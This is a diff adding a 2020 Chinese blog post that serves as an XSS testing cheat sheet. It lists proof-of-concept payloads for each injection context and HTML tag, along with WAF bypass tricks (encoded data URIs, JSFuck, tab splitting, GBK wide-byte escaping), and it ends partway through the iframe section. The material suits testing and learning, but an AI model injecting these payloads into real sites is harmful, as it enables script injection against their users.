@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="逆时针向" />
+
+
+
+<meta name="description" content="[TOC] 0x00 渗透流程 观察输入输出点，测试waf过滤情况">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS测试备忘录">
+<meta property="og:url" content="http://lynx1.cn/2020/08/15/XSS%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/index.html">
+<meta property="og:site_name" content="逆时针向">
+<meta property="og:description" content="[TOC] 0x00 渗透流程 观察输入输出点，测试waf过滤情况">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-08-15T01:46:49.000Z">
+<meta property="article:modified_time" content="2020-08-26T02:14:35.337Z">
+<meta property="article:author" content="逆时针向">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="逆时针向" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>XSS测试备忘录 | 逆时针向</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">逆时针向</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">路虽远,行则必达; 事虽小,做则必成!</p>
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">随笔</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" rel="noopener" href="https://github.com/Lynx-1" title="GitHub"></a>
+                            
+                                <a class="fa Google" target="_blank" rel="noopener" href="https://www.google.com/" title="Google"></a>
+                            
+                                <a class="fa Twitter" target="_blank" rel="noopener" href="https://twitter.com/Lynx9527" title="Twitter"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/Lynx-1">GitHub</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">逆时针向</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">逆时针向</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">路虽远,行则必达; 事虽小,做则必成!</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">随笔</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Lynx-1" title="GitHub"></a>
+                            
+                                <a class="fa Google" target="_blank" href="https://www.google.com/" title="Google"></a>
+                            
+                                <a class="fa Twitter" target="_blank" href="https://twitter.com/Lynx9527" title="Twitter"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-XSS测试备忘录" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/08/15/XSS%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/" class="article-date">
+      <time datetime="2020-08-15T01:46:49.000Z" itemprop="datePublished">2020-08-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XSS测试备忘录
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>[TOC]</p>
+<h2 id="0x00-渗透流程"><a href="#0x00-渗透流程" class="headerlink" title="0x00 渗透流程"></a>0x00 渗透流程</h2><ol>
+<li><p>观察输入输出点，测试waf过滤情况<a id="more"></a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">简单: <span class="string">&quot;&#x27;&lt;script javascript onload src&gt;&lt;a href&gt;&lt;/a&gt;#$%^</span></span><br><span class="line">全面: &#x27;&quot;;!-=#$%^&amp;&#123;()&#125;&lt;script javascript data onload href src img input&gt;&lt;a href&gt;&lt;/a&gt;alert(String.fromCharCode(88,83,83));prompt(1);confirm(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>观察输入输出情况，一些特殊字符是否被编码、标签是否被过滤、输出点在标签之间或标签之内</p>
+</li>
+<li><p>依据输出位置进行XSS</p>
+<ul>
+<li><p>标签之间：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">模型： &lt;div&gt;[xss]&lt;/div&gt;</span><br><span class="line">payload： &lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;或者&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">这些标签有：</span><br><span class="line">&lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt; &lt;svg&gt; &lt;video&gt; &lt;audio&gt;</span><br><span class="line">自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非我们闭合掉它们。</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br><span class="line">其他：&lt;math&gt;&lt;/math&gt;也不行 </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在JS标签内：</p>
+<p>在该位置，空格被过滤，可用/**/代替空格。输出在注释中，通过换行符%0a %0d使其逃逸出来。</p>
+<ol>
+<li>不在字符串内。<br>判断&lt;&gt;/是否被过滤。如果没有，那么直接插入就可以。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">[output]</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">payload：&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure></li>
+<li>在字符串中<br>此时需要闭合字符串，并保证插入的JS代码符合语法规范。<br>如：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var x=<span class="string">&quot;Input&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+input是输出点，我们首先要闭合双引号，才能保证XSS成功。如果我们无法闭合包括字符串的引号（引号被转义），就很难利用，除非存在两个输出点或宽字节。<br>前者在引号被转义成HTML实体时有效。此外，两个输出点的情况，也需要在某些特殊情况下才能构造。例子可参考<a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/xss-naxienian/content/4.html">那些年我们一起学XSS|反斜线复仇记</a><br>后者，在引号被转义成&quot;时有效。在网页为GBK编码时，存在宽字节问题。<blockquote>
+<p>宽字节问题：</p>
+<p>GBK编码第一字节（高字节）的范围为：0x81~0xFE</p>
+<p>GBK编码第二字节（低字节）的范围为：0x40<del>0x7E、0x80</del>0xFE</p>
+<p>\符号的十六进制为0x5C, 刚好处在GBK的低字节中，如果前面有一个高字节（如%c0），那么</p>
+<p>恰好会被组合成一个合法的字符，从而\被吃掉，双引号逃逸出来。<br>例子可参考<a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html">那些年我们一起学XSS|宽字节复仇记</a><br>​</p>
+</blockquote>
+</li>
+</ol>
+</li>
+<li><p>输出在HTML属性内<br>​</p>
+<ol>
+<li>文本属性中<br>例如：<code>&lt;input value=&quot;输出&quot;&gt;</code> 、 <code>&lt;img onload=&quot;...[输出]...&quot;&gt;</code> ，再比如 <code>&lt;body style=&quot;...[输出]...&quot;&gt;</code><ul>
+<li>无引号包裹，直接添加新的事件属性。</li>
+<li>有引号包括。首先测试引号是否可用，可用则闭合属性之后添加新的事件属性。<br>HTML的属性，如果被进行HTML实体编码(形如&#039;&amp;#x27)，那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造payload。<br>当然，也可以闭合属性后，然后再执行脚本。</li>
+</ul>
+</li>
+<li>src/href/action/xlink:href/autofocus/content/data 等属性<br>直接使用伪协议绕过。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript 伪协议： &lt;a href=javascript:alert(<span class="number">2</span>)&gt;test&lt;/a&gt;</span><br><span class="line">data 协议执行 javascript： &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;test&lt;/a&gt;(Chrome被拦截，Firefox可以)</span><br><span class="line">urlencode 版本： &lt;a href=data:text/html;%<span class="number">3</span>C%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>E%<span class="number">61</span>%<span class="number">6</span>C%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">2829</span>%<span class="number">29</span>%<span class="number">3</span>C%<span class="number">2</span>F%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>E&gt;(测试未通过)</span><br><span class="line">不使用 href 的另外一种组合来执行 js： &lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;javascript:alert(14)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;white&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span>&lt;/svg&gt;（均可） 或者： </span><br><span class="line">  &lt;math&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span>&lt;/math&gt;(Chrome不可，Firefox可以)</span><br></pre></td></tr></table></figure>
+如果不行，则测试添加事件进行触发。（首先还是需要闭合）<br>如：<code>&lt;a href=&quot;test.com&quot; onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</code><br>​</li>
+<li>on*事件中<br>插入合乎逻辑的JS代码即可。也可以使用伪协议。<br>常见事件<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">onload </span><br><span class="line">onclick</span><br><span class="line">onunload </span><br><span class="line">onchange </span><br><span class="line">onsubmit </span><br><span class="line">onreset </span><br><span class="line">onselect </span><br><span class="line">onblur </span><br><span class="line">onfocus </span><br><span class="line">onabort </span><br><span class="line">onkeydown </span><br><span class="line">onkeypress </span><br><span class="line">onkeyup </span><br><span class="line">ondbclick </span><br><span class="line">onmouseover </span><br><span class="line">onmousemove </span><br><span class="line">onmouseout </span><br><span class="line">onmouseup </span><br><span class="line">onforminput </span><br><span class="line">onformchange </span><br><span class="line">ondrag </span><br><span class="line">ondrop</span><br></pre></td></tr></table></figure>
+​</li>
+<li>style属性内及css代码之中IE可执行，并且在IE9以上被防御，不适合其他浏览器，基本已死。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">style&#x3D;&quot;width:expression(js代码)&quot;</span><br><span class="line">background-image:url(&#39;javascript:alert(2)&#39;)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>输出在meta标签</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>还有一些猥琐的思路，就是通过给http-equiv设置set-cookie，进一步重新设置 cookie 来干一些猥琐的事情。</p>
+<h2 id="0x01-具体标签的Payload"><a href="#0x01-具体标签的Payload" class="headerlink" title="0x01 具体标签的Payload"></a>0x01 具体标签的Payload</h2></li>
+</ul>
+</li>
+<li><p>a标签</p>
+<ul>
+<li>javascript伪协议：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(2)</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>data协议执行javascript：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span></span><br></pre></td></tr></table></figure>
+​</li>
+<li>urlencode版本：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>不使用href的另外一种组合来执行js：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;javascript:alert(14)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;white&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+或者：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>script标签</p>
+<ul>
+<li>最简单的测试payload：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>jsfuck版本：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<a target="_blank" rel="noopener" href="http://www.jsfuck.com/">jsfuck</a></li>
+<li>各种编码版本：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>/<span class="attr">src</span>=<span class="string">data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(-[])<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//不只是alert。prompt和confirm也可以弹窗 </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/3/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//可以用&quot;/&quot;来代替单引号和双引号 </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //我们还可以用char</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/7/</span>.source)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // &quot;.source&quot;不会影响alert(7)的执行</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&#x27;alert(1)&#x27;</span>,<span class="number">0</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //如果输出是在setTimeout里，我们依然可以直接执行alert(1)</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>button标签</p>
+<ul>
+<li>event事件实现js调用：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span>/<span class="attr">onclick</span>=<span class="string">alert(1)</span> &gt;</span>M<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>html5的新姿势：<br>需要交互的版本：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(1)</span>&gt;</span>M</span><br></pre></td></tr></table></figure>
+不需要交互的版本：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>p标签</p>
+<ul>
+<li>如果发现变量输出在p标签中，只要能跳出<code>&quot;&quot;</code>就足够了：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>/<span class="attr">onmouseover</span>=<span class="string">javascript:alert(1);</span> &gt;</span>M<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>img标签<br>有些姿势是因为浏览器的不同而不能成功执行的。</p>
+<ul>
+<li>只在chrome下有效：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> ?<span class="attr">itworksonchrome</span>?\/<span class="attr">onerror</span> = <span class="string">alert(1)</span>&gt;</span>  //只在chrome下有效</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  //只在chrome下有效</span><br></pre></td></tr></table></figure></li>
+<li>其他：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x:kcf&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>body标签<br>通过event事件来调用js</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>var标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">var</span> <span class="attr">onmouseover</span>=<span class="string">&quot;prompt(1)&quot;</span>&gt;</span>M<span class="tag">&lt;/<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>div标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>/<span class="attr">onmouseover</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span>X</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(52)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>iframe标签<br>有时候我们可以通过实体编码、换行和Tab字符来bypass。我们还可以通过事先在swf文件中插入我们的xss code，然后通过src属性来调用。不过关于flash，只有在crossdomain.xml文件中，allow-access-from domain=”*”允许从外部调用swf时，才可以通过flash来事先xss attack。<br>下面的<code>&amp;Tab;</code>为tab字符</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span><br></pre></td></tr></table></figure>
